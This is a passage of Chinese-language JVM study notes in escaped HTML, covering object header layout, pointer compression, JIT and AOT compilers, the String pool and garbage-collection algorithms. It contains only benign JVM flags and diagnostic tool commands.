class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">ObjectLayout</span> {\n    <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> <span class=\"hljs-type\">Object</span> <span class=\"hljs-variable\">o</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>();\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(String[] args)</span> {\n\n        System.out.println(ClassLayout.parseInstance(o).toPrintable());\n\n        <span class=\"hljs-keyword\">synchronized</span> (o) {\n            System.out.println(ClassLayout.parseInstance(o).toPrintable());\n        }\n    }\n}\n</code></div></pre>\n<p>前两个object header 为markword占用8个字节, 第三个object header 为类型指针(class pointer) 占用4个字节</p>\n<pre><code class=\"lang-properties\">java.lang.Object object internals:\n OFFSET  SIZE   TYPE DESCRIPTION                               VALUE\n      0     4        (object header)                           05 00 00 00 (00000101 00000000 00000000 00000000) (5)\n      4     4        (object header)                           00 00 00 00 (00000000 00000000 00000000 00000000) (0)\n      8     4        (object header)                           94 20 00 00 (10010100 00100000 00000000 00000000) (8340)\n     12     4        (loss due to the next object alignment)\nInstance size: 16 bytes\nSpace losses: 0 bytes internal + 4 bytes external = 4 bytes total\n\njava.lang.Object object internals:\n OFFSET  SIZE   TYPE DESCRIPTION                               VALUE\n      0     4        (object header)                           05 88 d2 25 (00000101 10001000 11010010 00100101) (634554373)\n      4     4        (object header)                           0d 02 00 00 (00001101 00000010 00000000 00000000) (525)\n      8     4        (object header)                           94 20 00 00 (10010100 00100000 00000000 00000000) (8340)\n     12     4        (loss due to the next object alignment)\nInstance size: 16 bytes\nSpace losses: 0 bytes internal + 4 bytes external = 4 bytes total\n</code></pre>\n<h4><a id=\"275__806\"></a>2.7.5 关闭指针压缩</h4>\n<ul>\n<li>\n<p>-XX:+PrintCommandLineFlags -version: 打印HotSpotVM 采用的自动优化参数</p>\n</li>\n<li>\n<p>-XX:+UseCompressedClassPointers: 开启类指针压缩</p>\n</li>\n<li>\n<p>-XX:+UseCompressedOops: 开启普通对象指针压缩</p>\n</li>\n</ul>\n<p>Java中默认开启指针压缩, 使用虚拟机参数<code>-XX:-UseCompressedClassPointers</code>来关闭此选项;  关闭后类型指针(class pointer)占用8个字节, 即第三个和第四个object header</p>\n<pre><code class=\"lang-properties\">java.lang.Object object internals:\n OFFSET  SIZE   TYPE DESCRIPTION                               VALUE\n      0     4        (object header)                           05 00 00 00 (00000101 00000000 00000000 00000000) (5)\n      4     4        (object header)                           00 00 00 00 (00000000 00000000 00000000 00000000) (0)\n      8     4        (object header)                           d8 1f a5 f0 (11011000 00011111 10100101 11110000) (-257613864)\n     12     4        (object header)                           c8 01 00 00 (11001000 00000001 00000000 00000000) (456)\nInstance size: 16 bytes\nSpace losses: 0 bytes internal + 0 bytes external = 0 bytes total\n\njava.lang.Object object internals:\n OFFSET  SIZE   TYPE DESCRIPTION                               VALUE\n      0     4        (object header)                           05 98 59 d1 (00000101 10011000 01011001 11010001) (-782657531)\n      4     4        (object header)                           c8 01 00 00 (11001000 00000001 00000000 00000000) (456)\n      8     4        (object header)                           d8 1f a5 f0 (11011000 00011111 10100101 11110000) (-257613864)\n     12     4        (object header)                           c8 01 00 00 (11001000 00000001 00000000 00000000) (456)\nInstance size: 16 bytes\nSpace losses: 0 bytes internal + 0 bytes external = 0 bytes total\n</code></pre>\n<h3><a id=\"28__836\"></a>2.8 对象访问定位</h3>\n<p>访问对象的方式主要有两种:</p>\n<ul>\n<li>句柄访问</li>\n</ul>\n<p><img src=\"https://cdn.qingweico.cn/blog/60379b175f4313ce25471152.png\" alt=\"\" /></p>\n<pre><code class=\"lang-properties\">句柄访问的缺点: 1&gt; 需要在内存中开辟额外的空间供句柄池存储数据 2&gt; 访问对象需要经过多次地址寻址\n优点: 当对象被移动(垃圾回收时移动对象很普遍)时, 只会改变句柄中的实例数据指针, 而reference本身不需要修改 \n</code></pre>\n<ul>\n<li>直接指针(HotSpot采用)</li>\n</ul>\n<p>使用直接指针来访问最大的好处就是速度更快,它节省了一次指针定位的时间开销</p>\n<p><img src=\"https://cdn.qingweico.cn/blog/60379b0f5f4313ce25470a05.png\" alt=\"\" /></p>\n<h3><a id=\"29__855\"></a>2.9 直接内存(堆外内存)</h3>\n<ul>\n<li>直接内存不是虚拟机运行时数据区的一部分, 也不是《Java虚拟机规范》中定义的内存区域</li>\n<li>直接内存是Java堆外的、直接向系统申请的内存空间</li>\n<li>来源于NIO, 通过存在堆中的DirectByteBuffer操作Native内存</li>\n<li>通常访问直接内存的速度会优先于Java堆, 即读写性能高\n<ul>\n<li>出于性能考虑, 读写频繁的场所可能会考虑使用直接内存</li>\n<li>Java的NIO库允许Java程序使用直接内存, 用于数据缓冲</li>\n</ul>\n</li>\n<li>直接内存也会出现OOM</li>\n<li>Java中使用DirectByteBuffer类来操作直接内存</li>\n<li>由于直接内存在Java堆外, 因此它的大小不会直接受限于<code>-Xmx</code>指定的最大堆大小, 但是系统内存是有限的, Java堆和直接内存的总和依然受限于操作系统能给出的最大内存</li>\n<li>直接内存的缺点:\n<ul>\n<li>分配回收成本较高</li>\n<li>不受JVM内存回收管理</li>\n</ul>\n</li>\n<li>直接内存大小可以通过<code>-XX:MaxDirectMemorySize</code>设置</li>\n<li>如果不指定, 默认与堆的最大值<code>-Xmx</code>参数值保持一致</li>\n</ul>\n<h3><a id=\"210_Java_872\"></a>2.10 Java内存状况分析</h3>\n<pre><code class=\"lang-properties\">jconsole\njvisualvm\njstat\njmap\njProfiler\n</code></pre>\n<h2><a id=\"3__882\"></a>3 执行引擎</h2>\n<p>执行引擎是Java虚拟机核心的组成部分之一</p>\n<p>&quot;虚拟机&quot;是一个相对于&quot;物理机&quot;的概念, 这两种机器都有代码执行的能力, 其区别是物理机的执行引擎是直接建立在处理器、缓存、指令集和操作系统层面的, 而虚拟机的执行引擎则是由软件自行实现的, 因此可以不受物理条件制约地定制指令集与执行引擎的结构体系, 能够执行那些不被硬件直接支持的指令集格式</p>\n<p>JVM的主要任务是负责装载字节码到其内部, 但是字节码并不能够直接运行在操作系统上, 因为字节码指令并非等价于本地机器指令, 它内部包含的仅仅只是一些能够被JVM所识别的字节码指令、符号表以及其他辅助信息,而执行引擎(Execution Engine)的主要任务就是<strong>将字节码指令解释/编译为对应平台上的本地机器指令才可以</strong>, JVM中的执行引擎充当了将高级语言翻译为机器语言的译者</p>\n<h3><a id=\"31__890\"></a>3.1 执行引擎的工作过程</h3>\n<ul>\n<li>执行引擎在执行过程中执行的字节码指令完全依赖于PC寄存器</li>\n<li>每当执行完一项指令操作后, PC寄存器就会更新下一条需要被执行的指令地址</li>\n<li>当然方法在执行的过程中, 执行引擎有可能会通过存储在局部变量表中的对象引用准确定位到储存在Java堆中的对象实例信息, 以及通过对象头中的元数据指针定位到目标对象的类型信息</li>\n<li>所有的Java虚拟机的执行引擎输入、输出都是一致的: 输入的是字节码二进制流, 处理过程是字节码解析执行的等效过程, 输出的是执行结果</li>\n</ul>\n<h3><a id=\"32_Java_897\"></a>3.2 Java代码编译和执行过程</h3>\n<ul>\n<li>解释器(Interpreter): 当Java虚拟机启动时会根据预定义的规范对字节码采用逐行解释的方法执行, 将每条字节码文件中的内容&quot;翻译&quot;为对应平台的本地机器指令执行</li>\n<li>JIT(Just In Time Compile) 编译器: 就是虚拟机将源代码直接编译成和本地机器平台相关的机器语言</li>\n<li>Java是半编译半解释型的语言; 之前Java仅有解释执行, 后来Java也发展出可以直接生成本地代码的编译器; 现在JVM在执行Java代码的时候, 通常都会将解释执行和编译执行二者结合起来进行</li>\n</ul>\n<h3><a id=\"33__903\"></a>3.3 指令&amp;汇编</h3>\n<h4><a id=\"331__905\"></a>3.3.1 指令</h4>\n<p>指令就是把机器码特定的0和1序列, 简化成对应的指令, 由于不同的硬件平台, 执行同一个操作, 对应的机器码可能不同, 所以不同的硬件平台的同一种指令(比如mov), 对应的机器码也可能不同</p>\n<h4><a id=\"332__909\"></a>3.3.2 指令集</h4>\n<p>不同的硬件平台,各自支持的指令是有差别的,因此每个平台所支持的指令称之为对应平台的指令集</p>\n<h4><a id=\"333__913\"></a>3.3.3 汇编语言</h4>\n<ul>\n<li>由于指令的可读性还是太差,于是产了汇编语言</li>\n<li>在汇编语言中,使用助记符(Mnemonics)代替机器指令的操作码,用地址符号(Symbol)或者标号(Label)代替指令或者操作数的地址</li>\n<li>在不同的硬件平台,汇编语言对应着不同的机器语言指令集,通过汇编过程转换成机器指令(由于计算机只认识指令码,所以用汇编语言编写的程序还必须翻译成机器指令码,计算机才能识别和识别)</li>\n</ul>\n<h3><a id=\"34_JIT_919\"></a>3.4 JIT编译器</h3>\n<p>HotSpot VM是目前市面上高性能虚拟机的代表作之一,它采用解释器与即时编译器并存的架构; 在Java VM运行的时候,解释器和即时编译器能够相互协作,各自取长补短,尽力去选择最合适的方式来权衡编译本地代码的时间和直接解释执行代码的时间</p>\n<p>JRocket VM内部就不含解释器, 字节码全部都依靠即时编译器编译后执行(这就是为什么JRocket VM速度很快的原因)</p>\n<p>为什么JIT编译这么快,HotSpot VM仍然使用解释器呢?</p>\n<ul>\n<li>\n<p>当程序启动后,解释器可以马上发挥作用,省去了编译的时间,立即执行; 而编译器要想发挥作用,把代码编译成本地代码,需要一定的执行时间,但编译为本地代码,执行效率高</p>\n</li>\n<li>\n<p>所以尽管JRocket VM中程序的执行性能会非常高效,但是在程序启动时必然需要花费更长的时间来进行编译; 对于服务端应用来说,启动并非是关注点,但是对于那些看重启动时间的应用场景而言,或许就需要采用解释器与即时编译并存的架构来换取一个平衡点; 在此模式下,<strong>当Java虚拟机启动时,解释器可以首先发挥作用,而不必等待即时编译器全部编译完成后再执行,这样可以省去许多不必要的编译时间; 随着时间的推移,编译器发挥作用,把越来越多的代码编译成本地代码,获得更高的执行效率</strong></p>\n</li>\n</ul>\n<p>Java语言的&quot;编译期&quot;其实是一段&quot;不确定&quot;的操作过程,因为它可能是指一个<strong>前端编译器</strong>——把.java文件转变为.class文件的过程,也可能指虚拟机的<strong>后端运行期编译器</strong>(JIT编译器, Just In Time Compiler)把字节码转变为机器码的过程,还可能是指使用<strong>静态提前编译器</strong>(AOT编译器  Ahead of Time Compiler)直接把.java文件编译为本地机器代码的过程</p>\n<p>JIT编译器: HotSpot VM的 C1、 C2编译器</p>\n<p>AOT编译器: GNU Compiler for Java(GCJ)、 Excelsior JET</p>\n<h4><a id=\"341__937\"></a>3.4.1 热点代码及探测方式</h4>\n<p>是否需要启动JIT编译器将字节码直接编译为对应平台的本地机器指令,则需要根据代码被调用执行频率而定; 那些需要被编译为本地代码的字节码,也被称之为&quot;热点代码&quot;,JIT编译器在运行时会针对那些频繁被调用的&quot;热点代码&quot;, JIT编译器在运行时会针对那些频繁被调用的&quot;热点代码&quot;做出深度优化,将其直接编译为对应平台德玩本地机器指令,以此提升Java程序执行性能</p>\n<ul>\n<li>一个被多次调用的方法,或者是一个方法体内部循环次数较多的循环体都可以被称之为&quot;热点代码&quot;,因此都可以通过JIT编译器编译为本地机器指令; 由于这种编译方式发生在方法的执行过程中,因此也被称为栈上替换,简称为OSR(On Stack Replacement)编译</li>\n<li>HotSpot VM采用的热点探测方式是基于计数器的热点探测</li>\n<li>采用基于计数器的热点探测,HotSpot VM将会为每一个方法都建立2个不同类型的计数器,分别为方法调用计数器(Invocation Counter)和回边计数器(Back Edge)\n<ul>\n<li>方法调用计数器用于统计方法的调用次数</li>\n<li>回边计数器则用于统计循环体执行的循环次数</li>\n</ul>\n</li>\n<li>方法调用计数器</li>\n</ul>\n<pre><code class=\"lang-properties\"># 热度衰减\n- 这个计数器就用于统计方法被调用的次数, 它的默认阈值在Client模式下是1500次, 在Server模式下是10000次; 超过这个阈值就会触发JIT编译\n- 这个阈值可以通过虚拟机参数 -XX:CompileThreshold来设置\n- 当一个方法被调用时,会检查该方法是否存在被JIT编译过的版本,如果存在,则优先使用编译后的本地代码来执行; 如果不存在已被编译过的版本,则将此方法的调用计数器值加1,然后判断方法调用计数器与回边计数器之和是否超过方法调用计数器的阈值; 如果已超过阈值,那么将会向即时编译器提交一个该方法的代码编译请求\n</code></pre>\n<pre><code class=\"lang-properties\">- 如果不做任何设置,方法调用计数器统计的并不是方法被调用的绝对次数,而是一个相对的执行频率,即一段时间之内方法被调用的次数,当超过一定的时间限度,如果方法的调用次数仍然不足以让它提交给即时编译器编译,那么这个方法的调用计数器就会被减少一半,这个过程称之为方法调用计数器热度的衰减(Counter Decay),而这段时间就称为此方法统计的半衰周期(Counter Half Life Time)\n- 进行热度衰减的动作是在虚拟机进行垃圾收集时顺便进行的,可以使用虚拟机参数-XX:-UseCounterDecay来关闭热度衰减, 让方法统计器统计方法调用的绝对次数,这样,只要系统运行时间足够长,绝大部分方法都会被编译成本地代码\n- 可以使用 -XX:CounterHalfLifeTime参数设置半衰周期的时间(s)\n</code></pre>\n<ul>\n<li>回边计数器: 它的作用是统计一个方法中循环体代码执行的次数,在字节码中遇到控制流向跳转的指令称为&quot;回边&quot;(Back Edge); 建立回边计数器的目的就是为了触发OSR编译</li>\n</ul>\n<h3><a id=\"35___C1C2_963\"></a>3.5 执行模式 &amp; C1、C2编译器</h3>\n<h4><a id=\"351_HotSpot_965\"></a>3.5.1 设置HotSpot的执行模式</h4>\n<pre><code class=\"lang-properties\"># 开启解释执行模式\njava -Xint -version\n# 开启编译执行模式\njava -Xcomp -version\n</code></pre>\n<h4><a id=\"352_HotSpot_VMJIT_974\"></a>3.5.2 HotSpot VM中JIT分类</h4>\n<p>在HotSpot VM中内嵌有两个JIT编译器, 分别为Client Compile和Server Compile, 但大多数情况下简称为C1编译器和C2编译器</p>\n<ul>\n<li>-client: 指定Java虚拟机运行在Client模式下, 并使用C1编译器(#C1编译器对字节码进行简单和可靠的优化, 耗时短, 以达到更快的编译速度)</li>\n<li>-server: 指定Java虚拟机运行在Server模式下, 并使用C2编译器(#C2进行耗时较长的优化, 以及激进优化, 但优化的代码执行效率更高)</li>\n</ul>\n<h4><a id=\"353_C1C2_981\"></a>3.5.3 C1和C2编译器不同的优化策略</h4>\n<ul>\n<li>C1编译器上主要有方法内联、去虚拟化、冗余消除</li>\n</ul>\n<pre><code class=\"lang-properties\">- 方法内联: 将引用的函数代码编译到引用点处, 这样可以减少栈帧的生成, 减少参数传递以及跳转的过程\n- 去虚拟化: 对唯一的实现类进行内联\n- 冗余消除: 在运行期间把一些不会执行的代码折叠\n</code></pre>\n<ul>\n<li>C2的优化主要是在全局层面, 逃逸分析是优化的基础</li>\n</ul>\n<pre><code class=\"lang-properties\">- 标量替换: 用标量值代替聚合对象的属性值\n- 栈上分配: 对于未逃逸的对象分配空间在栈上而不是堆上\n- 同步消除: 消除同步操作, 通常指synchronized\n</code></pre>\n<p>一般来说,JIT编译出的机器码性能比解释器高,C2编译器启动时长比C1编译器慢,系统稳定执行后,C2编译器执行速度远远快于C1编译器</p>\n<h3><a id=\"36_Graal__AOT_1001\"></a>3.6 Graal &amp; AOT编译器</h3>\n<p>自JDK10起, HotSpot加入了一个全新的即时编译器: Graal编译器</p>\n<pre><code class=\"lang-properties\"># 激活Graal的虚拟机参数\n-XX:+UnlockExperimentalVMOptions -XX:+UseJVMCICompiler\n</code></pre>\n<p>JDK9引入了AOT编译器(静态提前编译器, Ahead Of Compiler)</p>\n<p>JDK9引入了实验性AOT编译工具jaotc 它借助了Graal编译器, 将所输入的Java类文件转换为机器码, 并存放至生成的动态共享库之中</p>\n<p>所谓的AOT编译, 是与即使编译相对立的一个概念 即时编译是指在程序运行过程中将字节码转换为可在硬件上直接运行的机器码, 并部署至托管环境中的过程;  而AOT编译指的是在程序运行之前, 便将字节码转换为机器码的过程</p>\n<p>优点:</p>\n<ul>\n<li>Java虚拟机加载已经预编译成二进制库,  可以直接运行,  不必等待即使编译器的预热</li>\n</ul>\n<p>缺点:</p>\n<ul>\n<li>破坏了Java一次编译, 到处运行的特点,必须为每个不同硬件、OS编译对应的发行包</li>\n<li>降低了Java链接过程中的动态性, 加载的代码在编译期就必须全部已知</li>\n<li>还需要持续优化中,最初只支持Linux x64 java base</li>\n</ul>\n<h2><a id=\"4_String_1026\"></a>4 String的基本特性</h2>\n<ul>\n<li>字符串常量池中是不会储存相同内容的字符串</li>\n<li>字符串常量池存储在堆中(jdk8及其之后), 而jdk7及其之前是存储在永久代中</li>\n<li>String 的String Pool是一个固定大小的Hashtable,如果放进String Pool的String非常多,就会造成Hash冲突严重,从而导致链表会很长,而链表很长会直接造成的影响就是当调用String.intern()时性能下降</li>\n<li>可以使用<code>-XX:StingTableSize</code>设置StringTable的长度</li>\n<li>uintx StringTableSize=10 is outside the allowed range [ 128 … 16777216 ]</li>\n</ul>\n<pre><code class=\"lang-properties\"># 默认字符串常池的大小(JDK12)\njps\njinfo -flag StringTableSize java进程id\n&gt;&gt;&gt; -XX:StringTableSize=65536\n</code></pre>\n<p>Java语言规范里要求完全相同的字符串常量, 应该包含同样的Unicode字符序列(包含同一份码点序列的常量), 并且必须是指向同一个String类实例</p>\n<h3><a id=\"41_intern__1043\"></a>4.1 intern() 的总结</h3>\n<ul>\n<li>JDK6中, 将这个字符串对象尝试放入到串池中; 如果串池中没有,则并不会放入,返回已有的串池中对象的地址; 如果没有会把此对象复制一份放入串池,并返回串池中的对象地址</li>\n<li>JDK7起,将这个字符串对象尝试放入到串池; 如果串池中有,则并不会放入; 返回已有的串池中的对象地址; 如果没有则会把对象的引用地址复制一份,放入串池,并返回串池中的引用地址</li>\n</ul>\n<pre><code class=\"lang-properties\"># -Xlog:gc* 代替 -XX:+PrintGCDetails\n# XX:+PrintStringTableStatistics打印字符串常量池中的统计信息\n-Xms10m -Xmx10m -XX:+PrintStringTableStatistics -Xlog:gc*\n</code></pre>\n<h2><a id=\"5__1054\"></a>5 垃圾回收</h2>\n<p>什么是垃圾?</p>\n<p>垃圾是指在运行程序中没有任何指针指向的对象</p>\n<h3><a id=\"51__1060\"></a>5.1 垃圾标记阶段</h3>\n<ul>\n<li>在堆中存放着几乎所有的Java对象实例,在GC执行垃圾回收之前,首先需要区分出内存中哪些是存活对象,哪些是已经死亡的对象,只有被标记为已经死亡的对象,GC才会在执行垃圾回收时,释放掉其所占有的内存空间,因此这个过程可以成为垃圾回收阶段</li>\n<li>当一个对象已经不再被任何的存活对象继续引用时,就可以宣告为已经死亡</li>\n<li>判断对象存活一般有两种方式: 引用计数算法和可达性分析算法</li>\n</ul>\n<h4><a id=\"511__1066\"></a>5.1.1 引用计数算法(标记阶段)</h4>\n<ul>\n<li>引用计数算法(Reference Counting)对每个对象保存一个整型的引用计数器属性,用于记录对象被引用的情况</li>\n<li>优点: 实现简单,垃圾对象便于辨识; 判定效率高, 回收没有延迟性</li>\n<li>缺点:\n<ul>\n<li>它需要单独的字段储存计数器,这样的做法增加了储存开销</li>\n<li>每次赋值都需要更新计数器,伴随着加法和减法操作,这增加了时间开销</li>\n<li>引用计数器有一个严重的问题,即无法处理循环引用的情况,导致在Java的垃圾回收器中没有使用这类算法</li>\n</ul>\n</li>\n</ul>\n<h4><a id=\"512__1075\"></a>5.1.2 标记-清除算法(清除阶段)</h4>\n<p>最早出现也是最基础的算法(Mark - Sweep) 于1960年由Lisp之父John McCarthy提出</p>\n<p>分为两个阶段: 首先标记出需要回收的对象,在标记完成后,统一回收掉所有被标记的对象,也可以反过来,标记存活的对象,统一回收所有未被标记的对象 标记过程就是对象是否属于垃圾的判定过程</p>\n<h4><a id=\"513__1081\"></a>5.1.3 可达性分析算法(根搜索算法、追踪性垃圾收集)(标记阶段)</h4>\n<ul>\n<li>相对于引用计数算法而言,可达性分析算法不仅同样具备实现简单和执行高效等特点, 更重要的是该算法可以有效解决在引用计数算法中循环引用的问题,防止内存泄漏的发生</li>\n</ul>\n<h3><a id=\"52_GC_Roots_1085\"></a>5.2 GC Roots</h3>\n<p>在Java语言中, GC Roots包括以下几类元素</p>\n<ul>\n<li>虚拟机栈中引用的对象: 各个线程被调用的方法中使用到的参数、局部变量、临时变量等</li>\n<li>本地方法栈内JNI引用的对象</li>\n<li>方法区中类静态属性引用的对象, 比如Java类的引用类型静态变量</li>\n<li>方法区中常量引用的对象 比如字符串常量池里的引用</li>\n<li>所有被同步锁synchronized持有的对象</li>\n<li>Java虚拟机内部的引用: 基本数据类型对应的Class对象,一些常驻的异常对象(NullPointerException、OutOfMemoryError), 系统类加载器</li>\n<li>反映java虚拟机内部的JMXBean、JVM中注册的回调、本地代码缓存等</li>\n<li>如果要使用可达性分析算法来判断内存是否可以回收, 那么分析工必须在一个能保障一致性的快照中进行 这点不满足的话分析结果的准确性就无法保证</li>\n</ul>\n<p>除了固定的GC Roots集合以外, 还可以有其他对象临时性地加入, 比如 分代收集和局部回收(Partial GC)</p>\n<h3><a id=\"53_finalization_1100\"></a>5.3 对象的finalization机制</h3>\n<p>Java语言提供了对象终止机制来允许开发人员提供对象被销毁之前的自定义处理逻辑</p>\n<ul>\n<li>当垃圾回收器发现没有引用指向一个对象 即垃圾回收此对象之前, 总会先调用这个对象的finalize()方法</li>\n<li>finalize()方法允许在子类中被重写 用于在对象被回收时进行资源释放</li>\n</ul>\n<p>永远不要主动调用某个对象的finalize()方法, 应该交给垃圾回收机制调用</p>\n<ul>\n<li>在finalize()时可能会导致对象复活</li>\n<li>finalize() 方法的执行时间是没有保障的, 它完全由GC线程决定, 极端情况下若不发生GC, 则finalize()方法将没有执行机会</li>\n<li>一个糟糕的finalize()会严重影响GC的性能</li>\n</ul>\n<p>Java虚拟机中的对象可能的三种状态</p>\n<ul>\n<li>可触及的: 从根节点开始 可以到达这个对象</li>\n<li>可复活的: 对象的所有引用都被释放 但是对象有可能在finalize()中复活</li>\n<li>不可触及的: 对象的finalize()被调用 并且没有复活 那么就会进入不可触及状态 不可触及的对象不可能被复活 因为finalize()方法只会被调用一次</li>\n</ul>\n<p>一个无法触及的对象有可能在某一个条件下复活自己</p>\n<p>判断一个对象是否可回收, 至少要经历两次标记过程</p>\n<ul>\n<li>如果对象到GC Roots没有引用链, 则进行第一次标记</li>\n<li>进行筛选, 判断此对象是否有必要执行finalize() 方法\n<ul>\n<li>如果对象没有重写finalize方法, 或者finalize方法已经被虚拟机调用过了, 则虚拟机认为该对象没有必要执行finalize方法, 此对象被判定为不可触及的</li>\n<li>如果对象重写了finalize方法且还未执行过, 那么对象都被插入到F-Queue队列中: 由虚拟机自动创建的、低优先级的Finalizer线程触发其finalize方法执行</li>\n<li>finalize方法是对象逃脱死亡的最后机会, 稍后GC会对F-Queue队列中的对象进行第二次标记 如果对象在finalize方法中与引用链上的任何一个对象建立了联系,那么在第二次标记时对象会被移除&quot;即将回收&quot;集合; 之后, 若对象再次出现没有引用存在的情况 在这个情况下, finalize方法不会被再次调用, 对象会直接变成不可触及的状态, 也就是说 一个对象的finalize方法只会被调用一次</li>\n</ul>\n</li>\n</ul>\n<p>目前在JVM中比较常见的三种垃圾回收算法是标记清除算法(Mark-Sweep)、复制算法(Copying)、标记压缩算法(Mark-Compact)</p>\n<h3><a id=\"54__1131\"></a>5.4 垃圾清除阶段</h3>\n<h4><a id=\"541_MarkSweep_1133\"></a>5.4.1 标记清除算法(Mark-Sweep)</h4>\n<p>执行过程: 当堆中的有效内存空间被耗尽时, 就会停止整个程序(STW) 然后进行两项工作: 第一项是标记, 第二项则是清除</p>\n<ul>\n<li>标记: Collector从引用根节点开始遍历, 标记所有被引用的对象, 一般是在对象的Header中记录为可达对象</li>\n<li>清除: Collector对堆内存从头到尾进行线性的遍历, 如果发现某个对象在其Header中没有标记为可达对象, 则将其回收</li>\n</ul>\n<p>缺点:</p>\n<ul>\n<li>效率不算高</li>\n<li>在进行GC的时候, 需要停止整个应用程序</li>\n<li>这种方式清理出来的空闲内存是不连续的, 产生内存碎片 需要维护一个空闲列表</li>\n</ul>\n<p>何为清除:</p>\n<ul>\n<li>所谓的清除并不是真的置空 而是把需要清除的对象地址保存在空闲的地址列表里 下次有新对象需要加载时 判断垃圾的位置空间是否够用 如果够用直接覆盖</li>\n</ul>\n<h4><a id=\"542_Copying_1150\"></a>5.4.2 复制算法(Copying)</h4>\n<p>核心思想</p>\n<p>将活着的内存空间分为两块 每次只使用其中一块 在垃圾回收时将正在使用的内存中存活的对象赋值到未被使用的内存中 之后清除正在使用的内存块的所有对象 交换两个内存的角色 最后完成垃圾回收</p>\n<p>优点</p>\n<ul>\n<li>没有标记和清除过程 实现简单 运行高效</li>\n<li>可以保证空间的连续性 不会出现碎片问题</li>\n</ul>\n<p>缺点</p>\n<ul>\n<li>需要两倍的内存空间</li>\n<li>对于G1这种拆分成大量region的GC 复制而不是移动 意味着GC需要维护region之间对象引用的关系 不管是内存占用或者是时间开销也不小</li>\n</ul>\n<p>如果系统中的非垃圾对象很多 那么复制算法会复制很多存活的对象 代价很大</p>\n<p>应用场景</p>\n<p>在新生代 对常规应用的垃圾回收 一次通常可以回收70%-99%的内存空间 回收性价比很高</p>\n<h4><a id=\"543__MarkCompact__1172\"></a>5.4.3 标记-压缩(标记-整理 Mark-Compact) 算法</h4>\n<p>背景</p>\n<p>复制算法的高效性是建立在存活对象少、垃圾对象多的前提下 这种情况下新生代经常发生, 但是在老年代中 更常见的情况是大部分对象都是存活对象, 如果依然使用复制算法, 由于存活对象较多, 复制的成本也将很高, 因此, 基于老年代垃圾回收的特性, 需要使用其他的算法</p>\n<p>执行过程</p>\n<p>第一阶段和标记清除-算法一样 从根节点开始标记所有被引用对象</p>\n<p>第二阶段将所有的存活对象压缩到内存的一端, 按顺序排放, 之后清除边界外所有的空间</p>\n<p>优点</p>\n<ul>\n<li>消除了标记-清除算法当中, 内存区域分散的缺点, 再给新对象分配内存时, JVM只需持有一个内存的起始地址即可</li>\n<li>消除了复制算法中, 内存减半的高额代价</li>\n</ul>\n<p>缺点</p>\n<ul>\n<li>从效率上来说 标记-整理算法要低于复制算法</li>\n<li>移动对象的同时 如果对象被其他对象引用 则还需调整引用的地址</li>\n<li>移动过程中 需要全程暂停用户应用程序(STW)</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>/</th>\n<th>Mark-Sweep</th>\n<th>Mark-Compact</th>\n<th>Copying</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>速度</td>\n<td>中等</td>\n<td>最慢</td>\n<td>最快</td>\n</tr>\n<tr>\n<td>空间开销</td>\n<td>少(但会堆积碎片)</td>\n<td>少(不堆积碎片)</td>\n<td>通常需要存活对象的2倍大小(不堆积碎片)</td>\n</tr>\n<tr>\n<td>移动对象</td>\n<td>否</td>\n<td>否</td>\n<td>否</td>\n</tr>\n</tbody>\n</table>\n<h3><a id=\"55__1201\"></a>5.5 分代收集算法</h3>\n<h3><a id=\"56__1203\"></a>5.6 增量收集算法</h3>\n<p>基本思想</p>\n<p>如果一次将所有的垃圾进行处理 需要造成系统长时间的停顿 那么就可以让垃圾回收线程和应用程序交替执行 每次 垃圾回收只会收集一小片区域的内存空间 接着切换到应用程序线程 来回切换 直到垃圾回收完成</p>\n<p>增量收集算法的基础仍然是传统的标记-清除和复制算法 增量收集算法通过对线程间冲突的妥善处理 允许垃圾收集线程以分阶段的方式完成标记、清理和复制工作</p>\n<p>缺点</p>\n<p>使用这种方式 由于在垃圾回收过程中 间断性地还执行了应用程序代码 所以能够减少系统的停顿时间 但是 因为线程切换和上下文转换的消耗 会使得垃圾回收的总体成本上升 造成系统的吞吐量的下降</p>\n<h3><a id=\"57__1215\"></a>5.7 分区算法</h3>\n<p>一般来说 在相同条件下 对空间越大 一次GC时需要的时间就越长 有关GC产生的停顿也越长 为了更好地控制GC产生的停顿时间 将一块大的内存区域分割成多个小块 根据目标的停顿时间 每次合理地回收若干个小区间 而不是整个堆空间 从而减少一次GC所产生地停顿</p>\n<p>分代算法将按照对象的生命周期长短划分为两个部分 分区算法将整个堆空间划分成连续的不同小区间region</p>\n<p>每一个小区间都独立使用、独立回收 这种算法的好处是可以控制一次回收多少个小区间</p>\n<h3><a id=\"58_Systemgc_1223\"></a>5.8 System.gc()</h3>\n<p>在默认情况下 通过System.gc() 或者Runtime.getRuntime().gc()的调用 会显示触发Full GC 同时对老年代和新生代进行回收 尝试释放被丢弃对象占用的内存</p>\n<p>然而System.gc() 无法保证对垃圾收集器的调用</p>\n<h3><a id=\"59__1229\"></a>5.9 内存溢出</h3>\n<p>内存溢出(OOM): 没有内存空间 并且垃圾收集器也无法提供更过内存</p>\n<p>在抛出OutOfMemoryError之前 通常垃圾回收器会被触发 当然也不是在任何情况下垃圾回收器都会被触发 当分配一个超大数组且超过堆的最大值时 JVM可以判断出垃圾回收器并不能解决这个问题 所以直接抛出OOM</p>\n<h3><a id=\"510__1235\"></a>5.10 内存泄漏</h3>\n<p>举例</p>\n<ul>\n<li>单例模式 单例的生命周期和应用程序是一样的 如果持有对外部对象的引用的话 那么这个对象是不能被回收的 会导致内存泄漏的产生</li>\n<li>一些提供close的资源未关闭导致的内存泄漏 比如数据库连接 网络连接 或者io连接必须手动close</li>\n</ul>\n<h3><a id=\"511__1242\"></a>5.11 垃圾收集器</h3>\n<img src=\"https://cdn.qingweico.cn/blog/%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8.jpg\" alt=\"垃圾收集器\" />\n<h4><a id=\"5111_Serial__1246\"></a>5.11.1 Serial 收集器</h4>\n<p>一个单线程工作的收集器</p>\n<p>单线程的意义并不仅仅是说明它只会使用一个处理器或一条收集线程去完成垃圾收集工作 更重要的是强调在它进行垃圾收集时 必须暂停其他所有工作的线程 